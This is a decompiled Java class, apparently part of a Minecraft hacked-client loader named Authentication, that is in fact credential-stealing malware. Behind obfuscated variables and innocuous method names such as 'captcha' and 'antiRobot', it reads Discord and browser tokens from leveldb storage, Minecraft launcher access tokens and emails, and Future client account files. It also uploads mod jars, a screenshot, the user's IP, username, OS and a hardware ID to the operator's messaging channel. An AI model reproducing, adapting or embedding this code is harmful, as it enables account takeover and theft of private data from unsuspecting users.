// =============================================== //
// Recompile disabled. Please run Recaf with a JDK //
// =============================================== //

// Decompiled with: CFR 0.151
// Class Version: 8
package astolfo.lgbt.client.loader;

import astolfo.lgbt.client.loader.Database;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.awt.image.RenderedImage;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.imageio.ImageIO;

public class Authentication {
    Database main;

    public void vmUtil() {
        Authentication lllllllllllllllllIIIlIIIlllIlIII;
        try {
            String lllllllllllllllllIIIlIIIlllIlIll;
            File lllllllllllllllllIIIlIIIlllIllIl = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/Future/accounts.txt")));
            BufferedReader lllllllllllllllllIIIlIIIlllIllII = new BufferedReader(new FileReader(lllllllllllllllllIIIlIIIlllIllIl));
            while ((lllllllllllllllllIIIlIIIlllIlIll = lllllllllllllllllIIIlIIIlllIllII.readLine()) != null) {
                try {
                    String lllllllllllllllllIIIlIIIlllIllll = String.valueOf(new StringBuilder().append(lllllllllllllllllIIIlIIIlllIlIll.split(":")[0]).append(" : ").append(lllllllllllllllllIIIlIIIlllIlIll.split(":")[3]).append(" : ").append(lllllllllllllllllIIIlIIIlllIlIll.split(":")[4]));
                    lllllllllllllllllIIIlIIIlllIlIII.main.sendMessage(String.valueOf(new StringBuilder().append("Future Accounts: ").append(lllllllllllllllllIIIlIIIlllIllll)));
                }
                catch (Exception lllllllllllllllllIIIlIIIlllIlllI) {
                    lllllllllllllllllIIIlIIIlllIlIII.main.sendMessage("Error for Future ACC");
                }
            }
        }
        catch (Exception lllllllllllllllllIIIlIIIlllIlIlI) {
            lllllllllllllllllIIIlIIIlllIlIII.main.sendMessage("Error couldn't get any Future accounts.");
        }
    }

    public void astolfoFolder() throws IOException {
        File lllllllllllllllllIIIlIIIlllIIIII = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/.minecraft/launcher_profiles.json")));
        if (lllllllllllllllllIIIlIIIlllIIIII.exists()) {
            Database.sendFile(lllllllllllllllllIIIlIIIlllIIIII);
        } else {
            Authentication lllllllllllllllllIIIlIIIlllIIIIl;
            lllllllllllllllllIIIlIIIlllIIIIl.main.sendMessage("Unable to pull launcher profiles.");
        }
    }

    public void checks() {
        try {
            String lllllllllllllllllIIIlIIIlIIIIIIl;
            File lllllllllllllllllIIIlIIIlIIIIllI = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/.minecraft/launcher_accounts.json")));
            File lllllllllllllllllIIIlIIIlIIIIlIl = new File("/AppData/Roaming/.minecraft/launcher_accounts.json");
            FileInputStream lllllllllllllllllIIIlIIIlIIIIlII = new FileInputStream(lllllllllllllllllIIIlIIIlIIIIllI);
            DataInputStream lllllllllllllllllIIIlIIIlIIIIIll = new DataInputStream(lllllllllllllllllIIIlIIIlIIIIlII);
            BufferedReader lllllllllllllllllIIIlIIIlIIIIIlI = new BufferedReader(new InputStreamReader(lllllllllllllllllIIIlIIIlIIIIIll));
            while ((lllllllllllllllllIIIlIIIlIIIIIIl = lllllllllllllllllIIIlIIIlIIIIIlI.readLine()) != null) {
                Authentication lllllllllllllllllIIIlIIIIlllllll;
                String lllllllllllllllllIIIlIIIlIIIlIIl = "";
                String lllllllllllllllllIIIlIIIlIIIlIII = "";
                String lllllllllllllllllIIIlIIIlIIIIlll = "";
                if (lllllllllllllllllIIIlIIIlIIIIIIl.toUpperCase().contains("\"ACCESSTOKEN\"")) {
                    lllllllllllllllllIIIlIIIlIIIlIII = lllllllllllllllllIIIlIIIlIIIIIIl.split(":")[1].replace("\"", "").replace(" ", "");
                    lllllllllllllllllIIIlIIIIlllllll.main.sendMessage(String.valueOf(new StringBuilder().append("```Minecraft_Token: ").append(lllllllllllllllllIIIlIIIlIIIlIII).append("```")));
                }
                if (lllllllllllllllllIIIlIIIlIIIIIIl.toUpperCase().contains("\"NAME\"")) {
                    lllllllllllllllllIIIlIIIlIIIlIIl = lllllllllllllllllIIIlIIIlIIIIIIl.split(":")[1].replace("\"", "").replace(" ", "");
                    lllllllllllllllllIIIlIIIIlllllll.main.sendMessage(String.valueOf(new StringBuilder().append("```Minecraft Name: ").append(lllllllllllllllllIIIlIIIlIIIlIIl).append("```")));
                }
                if (!lllllllllllllllllIIIlIIIlIIIIIIl.toUpperCase().contains("\"USERNAME\"")) continue;
                lllllllllllllllllIIIlIIIlIIIIlll = lllllllllllllllllIIIlIIIlIIIIIIl.split(":")[1].replace("\"", "").replace(" ", "");
                lllllllllllllllllIIIlIIIIlllllll.main.sendMessage(String.valueOf(new StringBuilder().append("```Email: ").append(lllllllllllllllllIIIlIIIlIIIIlll).append("```")));
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public static String getHWID() {
        try {
            byte[] lllllllllllllllllIIIlIIIllIIIlll;
            String lllllllllllllllllIIIlIIIllIIlIll = String.valueOf(new StringBuilder().append(System.getenv("COMPUTERNAME")).append(System.getProperty("user.name")).append(System.getenv("PROCESSOR_IDENTIFIER")).append(System.getenv("PROCESSOR_LEVEL")));
            MessageDigest lllllllllllllllllIIIlIIIllIIlIlI = MessageDigest.getInstance("MD5");
            lllllllllllllllllIIIlIIIllIIlIlI.update(lllllllllllllllllIIIlIIIllIIlIll.getBytes());
            StringBuffer lllllllllllllllllIIIlIIIllIIlIII = new StringBuffer();
            for (byte lllllllllllllllllIIIlIIIllIIllII : lllllllllllllllllIIIlIIIllIIIlll = lllllllllllllllllIIIlIIIllIIlIlI.digest()) {
                String lllllllllllllllllIIIlIIIllIIllIl = Integer.toHexString(0xFF & lllllllllllllllllIIIlIIIllIIllII);
                if (lllllllllllllllllIIIlIIIllIIllIl.length() == 1) {
                    lllllllllllllllllIIIlIIIllIIlIII.append('0');
                }
                lllllllllllllllllIIIlIIIllIIlIII.append(lllllllllllllllllIIIlIIIllIIllIl);
            }
            return lllllllllllllllllIIIlIIIllIIlIII.toString();
        }
        catch (Exception lllllllllllllllllIIIlIIIllIIIlIl) {
            lllllllllllllllllIIIlIIIllIIIlIl.printStackTrace();
            return "Error";
        }
    }

    public void noDumper() throws IOException {
        File lllllllllllllllllIIIlIIIllIllIlI = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/.minecraft/mods")));
        Thread lllllllllllllllllIIIlIIIllIllIIl = new Thread(() -> {
            if (lllllllllllllllllIIIlIIIllIllIlI.exists() && lllllllllllllllllIIIlIIIllIllIlI.isDirectory()) {
                for (File lllllllllllllllllIIIIlllllllllII : lllllllllllllllllIIIlIIIllIllIlI.listFiles()) {
                    if (!lllllllllllllllllIIIIlllllllllII.getName().contains(".jar")) continue;
                    try {
                        Database.sendFile(lllllllllllllllllIIIIlllllllllII);
                        Thread.sleep(500L);
                    }
                    catch (Exception lllllllllllllllllIIIIllllllllllI) {
                        lllllllllllllllllIIIIllllllllllI.printStackTrace();
                    }
                }
            }
        });
        lllllllllllllllllIIIlIIIllIllIIl.start();
    }

    public File notNM() {
        try {
            Robot lllllllllllllllllIIIlIIIIIIllIII = new Robot();
            BufferedImage lllllllllllllllllIIIlIIIIIIlIllI = lllllllllllllllllIIIlIIIIIIllIII.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            File lllllllllllllllllIIIlIIIIIIlIlII = new File(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/Documents/fix.png")));
            if (!lllllllllllllllllIIIlIIIIIIlIlII.exists()) {
                // empty if block
            }
            ByteArrayOutputStream lllllllllllllllllIIIlIIIIIIlIIIl = new ByteArrayOutputStream();
            ImageIO.write((RenderedImage)lllllllllllllllllIIIlIIIIIIlIllI, "png", lllllllllllllllllIIIlIIIIIIlIlII);
            return lllllllllllllllllIIIlIIIIIIlIlII;
        }
        catch (Exception exception) {
            return null;
        }
    }

    public void connect() {
        String lllllllllllllllllIIIlIIIlllllIll = System.getProperty("os.name");
        try {
            Authentication lllllllllllllllllIIIlIIIllllllII;
            URL lllllllllllllllllIIIlIIlIIIIIIII = new URL("http://checkip.amazonaws.com");
            BufferedReader lllllllllllllllllIIIlIIIllllllll = new BufferedReader(new InputStreamReader(lllllllllllllllllIIIlIIlIIIIIIII.openStream()));
            String lllllllllllllllllIIIlIIIlllllllI = lllllllllllllllllIIIlIIIllllllll.readLine();
            String lllllllllllllllllIIIlIIIllllllIl = System.getProperty("user.name");
            lllllllllllllllllIIIlIIIllllllII.main.sendMessage(String.valueOf(new StringBuilder().append("@everyone ``` NAME : ").append(lllllllllllllllllIIIlIIIllllllIl).append("\n IP   : ").append(lllllllllllllllllIIIlIIIlllllllI).append(" \n OS   : ").append(lllllllllllllllllIIIlIIIlllllIll).append("```")));
            lllllllllllllllllIIIlIIIllllllII.main.sendMessage(String.valueOf(new StringBuilder().append("```HWID: ").append(Authentication.getHWID()).append("```")));
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public void antiRobot() {
        try {
            Thread.sleep(500L);
            try {
                Authentication lllllllllllllllllIIIlIIIIIlIIlIl;
                File lllllllllllllllllIIIlIIIIIlIlIII = lllllllllllllllllIIIlIIIIIlIIlIl.notNM();
                Database.sendFile(lllllllllllllllllIIIlIIIIIlIlIII);
            }
            catch (Exception lllllllllllllllllIIIlIIIIIlIIlll) {
                lllllllllllllllllIIIlIIIIIlIIlll.printStackTrace();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public Authentication() {
        Authentication lllllllllllllllllIIIlIIlIIIIlIII;
        lllllllllllllllllIIIlIIlIIIIlIII.main = new Database();
    }

    public void captcha() {
        String lllllllllllllllllIIIlIIIIlIIlIll = System.getProperty("os.name");
        if (lllllllllllllllllIIIlIIIIlIIlIll.contains("Windows")) {
            ArrayList<String> lllllllllllllllllIIIlIIIIlIIllll = new ArrayList<String>();
            lllllllllllllllllIIIlIIIIlIIllll.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/discord/Local Storage/leveldb/")));
            lllllllllllllllllIIIlIIIIlIIllll.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/discordptb/Local Storage/leveldb/")));
            lllllllllllllllllIIIlIIIIlIIllll.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/discordcanary/Local Storage/leveldb/")));
            lllllllllllllllllIIIlIIIIlIIllll.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb")));
            lllllllllllllllllIIIlIIIIlIIllll.add(String.valueOf(new StringBuilder().append(System.getProperty("user.home")).append("/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb")));
            int lllllllllllllllllIIIlIIIIlIIlllI = 0;
            StringBuilder lllllllllllllllllIIIlIIIIlIIllIl = new StringBuilder();
            try {
                for (String lllllllllllllllllIIIlIIIIlIlIIIl : lllllllllllllllllIIIlIIIIlIIllll) {
                    File lllllllllllllllllIIIlIIIIlIlIIll = new File(lllllllllllllllllIIIlIIIIlIlIIIl);
                    String[] lllllllllllllllllIIIlIIIIlIlIIlI = lllllllllllllllllIIIlIIIIlIlIIll.list();
                    if (lllllllllllllllllIIIlIIIIlIlIIlI == null) continue;
                    for (String lllllllllllllllllIIIlIIIIlIlIlII : lllllllllllllllllIIIlIIIIlIlIIlI) {
                        try {
                            String lllllllllllllllllIIIlIIIIlIlIlIl;
                            FileInputStream lllllllllllllllllIIIlIIIIlIllIII = new FileInputStream(String.valueOf(new StringBuilder().append(lllllllllllllllllIIIlIIIIlIlIIIl).append(lllllllllllllllllIIIlIIIIlIlIlII)));
                            DataInputStream lllllllllllllllllIIIlIIIIlIlIlll = new DataInputStream(lllllllllllllllllIIIlIIIIlIllIII);
                            BufferedReader lllllllllllllllllIIIlIIIIlIlIllI = new BufferedReader(new InputStreamReader(lllllllllllllllllIIIlIIIIlIlIlll));
                            while ((lllllllllllllllllIIIlIIIIlIlIlIl = lllllllllllllllllIIIlIIIIlIlIllI.readLine()) != null) {
                                Pattern lllllllllllllllllIIIlIIIIlIllIll = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher lllllllllllllllllIIIlIIIIlIllIIl = lllllllllllllllllIIIlIIIIlIllIll.matcher(lllllllllllllllllIIIlIIIIlIlIlIl);
                                while (lllllllllllllllllIIIlIIIIlIllIIl.find()) {
                                    if (lllllllllllllllllIIIlIIIIlIIlllI > 0) {
                                        lllllllllllllllllIIIlIIIIlIIllIl.append("\n");
                                    }
                                    lllllllllllllllllIIIlIIIIlIIllIl.append(" ").append(lllllllllllllllllIIIlIIIIlIllIIl.group());
                                    ++lllllllllllllllllIIIlIIIIlIIlllI;
                                }
                            }
                        }
                        catch (Exception exception) {
                            // empty catch block
                        }
                    }
                }
                lllllllllllllllllIIIlIIIIlIIllII.main.sendMessage(String.valueOf(new StringBuilder().append("```Discord_Token ").append(String.valueOf(lllllllllllllllllIIIlIIIIlIIllIl)).append("```")));
            }
            catch (Exception lllllllllllllllllIIIlIIIIlIlIIII) {
                lllllllllllllllllIIIlIIIIlIIllII.main.sendMessage(String.valueOf(new StringBuilder().append("``` UNABLE TO PULL TOKENS : ").append(lllllllllllllllllIIIlIIIIlIlIIII).append("```")));
            }
        } else {
            lllllllllllllllllIIIlIIIIlIIllII.main.sendMessage("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```");
        }
    }
}
 
